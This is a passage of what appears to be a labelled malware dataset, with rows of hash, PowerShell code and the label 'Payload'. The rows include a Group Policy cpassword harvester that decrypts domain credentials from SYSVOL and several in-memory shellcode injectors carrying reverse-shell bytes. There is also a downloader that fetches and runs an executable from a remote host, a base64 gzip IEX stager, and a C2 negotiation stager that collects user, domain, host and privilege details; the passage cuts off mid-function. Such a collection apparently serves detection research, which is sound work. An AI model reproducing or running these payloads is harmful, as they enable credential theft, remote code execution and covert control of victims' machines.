        $TableGPPPasswords.Columns.Add('File') | Out-Null           

        
        
        
 
        
        if($DomainController){
            $TargetDC = ""\\\\$DomainController""
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        
        $set = ""abcdefghijklmnopqrstuvwxyz"".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("""",$result)        
        $DrivePath = ""$TargetDC\\sysvol""

        
        Write-Verbose ""Creating temp drive $DriveName mapped to $DrivePath...""
        If ($Credential.UserName){
        
            
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }        
    }

    Process
    {
        
        $DriveCheck = Get-PSDrive | Where { $_.name -like ""$DriveName""}
        if($DriveCheck) {
            Write-Verbose ""$Drivename created.""
        }else{
            Write-Verbose ""Failed to mount $DriveName to $DrivePath.""
            return
        }

        
        
        
        
        
        $DriveLetter = $DriveName+"":""

        
        Write-Verbose ""Gathering GPP xml files from $DrivePath...""
        $XMlFiles = Get-ChildItem -Path $DriveLetter -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'          

        
        Write-Verbose ""Paring content from GPP xml files...""
        $XMlFiles | 
        ForEach-Object {
            $FileFullName = $_.fullname
            $FileName = $_.Name
            [xml]$FileContent = Get-Content -Path ""$FileFullName""
            
            
            if($FileName -eq ""Drives.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = """"         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq ""Groups.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $Filecontent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = $_.properties.newname        
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq ""Services.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $Filecontent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = """"         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq ""ScheduledTasks.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $Filecontent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = """"         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq ""DataSources.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $Filecontent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = """"         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }

            
            if($FileName -eq ""Printers.xml""){   

                Write-Verbose ""$FileName found, processing...""
                 
                $Filecontent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = """"         
                    
                    
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FileFullName) | Out-Null      
                }                
            }
            
        }

        
        Write-Verbose ""Removing temp drive $DriveName...""
        Remove-PSDrive $DriveName
        
        
        if ( -not $XMlFiles ) {
            throw 'No preference files found.'
            return
        }

        
        $TableGPPPasswords 
    }
}
",Payload
8c0a1e879f980ee2decba5b04e8acec1fd0efe888517c74d1e7150b584f835e3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x2b,0x2c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
c624b6592c4ed3ace246a72e9909d2d023cb9980625104be0b9b5ad7e4c2a411,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
0c94ea623f1a303943ba4073ad3b44f137e567c9feb363f3b7ed6e765d590cc3,"
$KUo = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $KUo -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc9,0xba,0xd1,0x03,0x54,0x3c,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x2d,0xe1,0xa1,0xc0,0x25,0x64,0x49,0x39,0xb5,0x09,0xc3,0xdc,0x84,0x09,0xb7,0x95,0xb6,0xb9,0xb3,0xf8,0x3a,0x31,0x91,0xe8,0xc9,0x37,0x3e,0x1e,0x7a,0xfd,0x18,0x11,0x7b,0xae,0x59,0x30,0xff,0xad,0x8d,0x92,0x3e,0x7e,0xc0,0xd3,0x07,0x63,0x29,0x81,0xd0,0xef,0x9c,0x36,0x55,0xa5,0x1c,0xbc,0x25,0x2b,0x25,0x21,0xfd,0x4a,0x04,0xf4,0x76,0x15,0x86,0xf6,0x5b,0x2d,0x8f,0xe0,0xb8,0x08,0x59,0x9a,0x0a,0xe6,0x58,0x4a,0x43,0x07,0xf6,0xb3,0x6c,0xfa,0x06,0xf3,0x4a,0xe5,0x7c,0x0d,0xa9,0x98,0x86,0xca,0xd0,0x46,0x02,0xc9,0x72,0x0c,0xb4,0x35,0x83,0xc1,0x23,0xbd,0x8f,0xae,0x20,0x99,0x93,0x31,0xe4,0x91,0xaf,0xba,0x0b,0x76,0x26,0xf8,0x2f,0x52,0x63,0x5a,0x51,0xc3,0xc9,0x0d,0x6e,0x13,0xb2,0xf2,0xca,0x5f,0x5e,0xe6,0x66,0x02,0x36,0xcb,0x4a,0xbd,0xc6,0x43,0xdc,0xce,0xf4,0xcc,0x76,0x59,0xb4,0x85,0x50,0x9e,0xbb,0xbf,0x25,0x30,0x42,0x40,0x56,0x18,0x80,0x14,0x06,0x32,0x21,0x15,0xcd,0xc2,0xce,0xc0,0x78,0xc6,0x58,0x52,0x16,0xb0,0x2e,0xcc,0xe5,0x40,0x47,0xec,0x63,0xa6,0x07,0xbe,0x23,0x77,0xe7,0x6e,0x84,0x27,0x8f,0x64,0x0b,0x17,0xaf,0x86,0xc1,0x30,0x45,0x69,0xbc,0x69,0xf1,0x10,0xe5,0xe2,0x60,0xdc,0x33,0x8f,0xa2,0x56,0xb0,0x6f,0x6c,0x9f,0xbd,0x63,0x18,0x6f,0x88,0xde,0x8e,0x70,0x26,0x74,0x2e,0xe5,0xcd,0xdf,0x79,0x91,0xcf,0x06,0x4d,0x3e,0x2f,0x6d,0xc6,0xf7,0xa5,0xce,0xb0,0xf7,0x29,0xcf,0x40,0xae,0x23,0xcf,0x28,0x16,0x10,0x9c,0x4d,0x59,0x8d,0xb0,0xde,0xcc,0x2e,0xe1,0xb3,0x47,0x47,0x0f,0xea,0xa0,0xc8,0xf0,0xd9,0x30,0x34,0x27,0x27,0x47,0x54,0xfb;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sR4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sR4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sR4,0,0,0);for (;;){Start-sleep 60};

",Payload
bb2fcf0a07ce7797c373c312a48e73d8d27ce6d4086a441398231f02c70d0227,"
(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',""$env:TEMP\\ik_001.exe"");Start-Process (""$env:TEMP\\ik_001.exe"")

",Payload
dd18b740f49795286f5981b087163d2caea2b512109e7abc934f0601da6f1c5e,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc6,0xce,0x85,0x87,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
93845515089e0fe8174e64033bdda6ab99a45e30469d1f837168aacb79e879b8,"
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""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""));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

",Payload
767348a3ff05875b85a1d0943f56ff8bbf3a93090ef49953c00300ec11edf9bf,"function Start-Negotiate {
    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            
            $IV = $In[0..15];
            try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = ""CBC"";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    
    $Null = [Reflection.Assembly]::LoadWithPartialName(""System.Security"");
    $Null = [Reflection.Assembly]::LoadWithPartialName(""System.Core"");

    
    $ErrorActionPreference = ""SilentlyContinue"";
    $e=[System.Text.Encoding]::ASCII;
    $customHeaders = """";
    $SKB=$e.GetBytes($SK);
    
    
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode=""CBC"";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    $rk=$rs.ToXmlString($False);

    
    $ID=-join(""ABCDEFGHKLMNPRSTUVWXYZ123456789"".ToCharArray()|Get-Random -Count 8);

    
    $ib=$e.getbytes($rk);

    
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    
    
    if(-not $IE) {
        $IE=New-Object -COM InternetExplorer.Application;
        $ie.Silent = $True;
        $IE.visible = $False;
    }

    if ($customHeaders -ne """") {
        
	    
        if ($customHeaders.Contains(""Host: "")) {
                $IE.navigate2($s,14,0,$Null,$Null);
                while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
        }
    }
    
    
    
    
    
    
    
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    
    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p));
    $IE.navigate2($s+""/index.jsp"", 14, 0, $bytes, $customHeaders);
    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
    $html = $IE.document.GetType().InvokeMember(""body"", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;

    try {
        $raw = [System.Convert]::FromBase64String($html);
    }
    catch {$Null};

    
    $de=$e.GetString($rs.decrypt($raw,$false));
    
    
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    
    $nonce=[String]([long]$nonce + 1);

    
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode=""CBC"";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+=""|$ip"";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    
    if(([Environment]::UserName).ToLower() -eq ""system""){$i+=""|True""}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator"")}

    
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    
    $i += ""|powershell|"" + $PSVersionTable.PSVersion.Major;

    
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    
    
    
    
    
    
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
